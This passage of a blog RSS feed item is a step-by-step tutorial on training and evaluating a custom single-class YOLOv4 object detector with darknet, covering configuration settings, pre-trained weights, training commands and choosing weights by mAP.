  &lt;li&gt;&lt;strong&gt;test&lt;/strong&gt;: The location of the test set path files&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;names&lt;/strong&gt;: The location of the object classification file&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;backup&lt;/strong&gt;: The output path location&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;obj.data&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;modify-configuration&quot;&gt;&lt;strong&gt;Modify Configuration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;The related configuration files are all stored in the “&lt;strong&gt;darknet\cfg&lt;/strong&gt;” directory.&lt;br /&gt;
Network structure definition file “&lt;strong&gt;yolov4-obj.cfg&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;For details on modifying the hyperparameters,&lt;br /&gt;
refer to “&lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-train-to-detect-your-custom-objects&quot;&gt;How to train (to detect your custom objects)&lt;/a&gt;” point 1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-10.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;yolov4 document&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In the configuration directory,&lt;br /&gt;
copy “&lt;strong&gt;&lt;a href=&quot;https://github.com/AlexeyAB/darknet/blob/master/cfg/yolov4-custom.cfg&quot;&gt;yolov4-custom.cfg&lt;/a&gt;&lt;/strong&gt;” to “&lt;strong&gt;yolov4-obj.cfg&lt;/strong&gt;” and modify the configuration part:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;batch&lt;/strong&gt;: the number of small batches (can be adjusted according to GPU memory)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;subdivisions&lt;/strong&gt;: further subdivision of each small batch&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;max_batches&lt;/strong&gt;: the maximum number of small batches for training
    &lt;ul&gt;
      &lt;li&gt;the training stops once this number is exceeded&lt;/li&gt;
      &lt;li&gt;Usually set to classes * 2000 and cannot be less than the number of image samples&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;steps and scales&lt;/strong&gt;: related to learning rate adjustment
    &lt;ul&gt;
      &lt;li&gt;Steps: Usually set to &lt;strong&gt;80%~90% of max_batches&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Scales: Usually, no need to adjust&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;width and height&lt;/strong&gt;: set the size of the network input
    &lt;ul&gt;
      &lt;li&gt;Generally set to be consistent with the image samples, or any multiple of 32&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;classes&lt;/strong&gt;: set the number of categories
    &lt;ul&gt;
      &lt;li&gt;Must be consistently modified for all &lt;strong&gt;[yolo]&lt;/strong&gt; layers&lt;/li&gt;
      &lt;li&gt;Must be consistent with the sample target detection count&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;filters&lt;/strong&gt;: set the number of convolutional kernels in specific locations
    &lt;ul&gt;
      &lt;li&gt;Must be set for the &lt;strong&gt;[convolutional]&lt;/strong&gt; layer connected to the &lt;strong&gt;[yolo]&lt;/strong&gt; layer&lt;/li&gt;
      &lt;li&gt;Must be set to &lt;strong&gt;(classes + 5) * 3&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;batch=64
subdivisions=16
max_batches=2000
steps=1600, 1800
scales=.1,.1

... ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;pre-trained-weight-files&quot;&gt;Pre-trained Weight Files&lt;/h2&gt;
&lt;p&gt;The related files for pre-training are stored in the “&lt;strong&gt;darknet\weight&lt;/strong&gt;” directory, &lt;br /&gt;
Pre-trained weight file (&lt;strong&gt;yolov4.conv.137&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;Each network has a corresponding pre-trained convolutional layer weight file.&lt;br /&gt;
Refer to “&lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-train-to-detect-your-custom-objects&quot;&gt;How to train (to detect your custom objects)&lt;/a&gt;” point 7 for which file to download.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;yolov4 document&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;For this experiment, using the YOLOv4 network, download the corresponding pre-trained weight file “&lt;a href=&quot;https://github.com/AlexeyAB/darknet/releases/download/darknet_yolo_v3_optimal/yolov4.conv.137&quot;&gt;yolov4.conv.137&lt;/a&gt;”.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;training-the-model&quot;&gt;Training the Model&lt;/h2&gt;
&lt;p&gt;Refer to ““&lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-train-to-detect-your-custom-objects&quot;&gt;How to train (to detect your custom objects)&lt;/a&gt;” points 8 and 9 for model training.&lt;br /&gt;
For multi-GPU training, refer to “&lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-train-with-multi-gpu&quot;&gt;How to train with multi-GPU&lt;/a&gt;”.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector train data/obj.data yolo-obj.cfg yolov4.conv.137&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;training-results&quot;&gt;Training Results&lt;/h2&gt;
&lt;p&gt;All &lt;strong&gt;.weights&lt;/strong&gt; weight files output after training are stored in the &lt;strong&gt;backup&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;Because the training process archives the weight file at each stage, the directory contains multiple weight files, generally archived once every &lt;strong&gt;1k&lt;/strong&gt; iterations.&lt;/p&gt;

&lt;h4 id=&quot;a-very-important-point-to-note-here&quot;&gt;&lt;strong&gt;A very important point to note here:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;When using the model in a production environment, only the best weight file is needed.&lt;/p&gt;

&lt;p&gt;The selection of the weight file is not based on the highest iteration count but on the highest &lt;strong&gt;mAP (mean average precision)&lt;/strong&gt; or &lt;strong&gt;IoU (intersect over union)&lt;/strong&gt; values.&lt;/p&gt;

&lt;p&gt;For the specific reason, see “&lt;a href=&quot;https://github.com/AlexeyAB/darknet#when-should-i-stop-training&quot;&gt;When should I stop training&lt;/a&gt;” point 2.2.&lt;/p&gt;

&lt;p&gt;For example,&lt;br /&gt;
compare the weight files archived at each stage between 1k and 5k iterations:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector map data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_1000.weights&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-12.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;1k iterations&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector map data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_2000.weights&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-13.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;2k iterations&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector map data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_3000.weights&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-14.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;3k iterations&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector map data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_4000.weights&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-15.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;4k iterations&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector map data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_5000.weights&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-16.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;5k iterations&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It can be seen that the highest &lt;strong&gt;mAP&lt;/strong&gt; and &lt;strong&gt;IoU&lt;/strong&gt; values are at 4k iterations, not at 5k iterations.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;testing-the-model&quot;&gt;Testing the Model&lt;/h2&gt;
&lt;p&gt;Refer to “&lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-use-on-the-command-line&quot;&gt;How to use on the command line&lt;/a&gt;” for model testing.&lt;/p&gt;

&lt;h4 id=&quot;the-command-format-is-roughly-as-follows&quot;&gt;the command format is roughly as follows:&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector &amp;lt;train/test/valid/demo/map&amp;gt; &amp;lt;data&amp;gt; &amp;lt;cfg&amp;gt; &amp;lt;weights (optional)&amp;gt; [-ext_output &amp;lt;ext&amp;gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Verify the results on the test set.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector valid data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_last.weights&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Demonstrate the object detection effect of the model on images.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector test data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_last.weights -ext_output data\0967f9db79f4462197bed6565a17ed63.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-17.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;detect result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Demonstrate the object detection effect of the model on videos.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;darknet.exe detector demo data\obj.data cfg\yolov4-custom.cfg backup\yolov4-custom_last.weights -ext_output data\test.mp4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-18.gif&quot; alt=&quot;&quot; /&gt;
 &lt;em&gt;detect result (videos)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It’s cool :)&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;statement&quot;&gt;Statement&lt;/h2&gt;

&lt;p&gt;The purpose of this experiment is solely to reproduce custom single-class object detection using YOLOv4.&lt;/p&gt;

</description>
        <pubDate>Fri, 19 Mar 2021 03:07:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2021/03/19/solutions-object-detection-0-to-001-yolov4/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2021/03/19/solutions-object-detection-0-to-001-yolov4/</guid>
        
        <category>Solutions</category>
        
        <category>Object Detection</category>
        
        <category>YOLO</category>
        
        <category>DNN</category>
        
        
      </item>
    
  </channel>
</rss>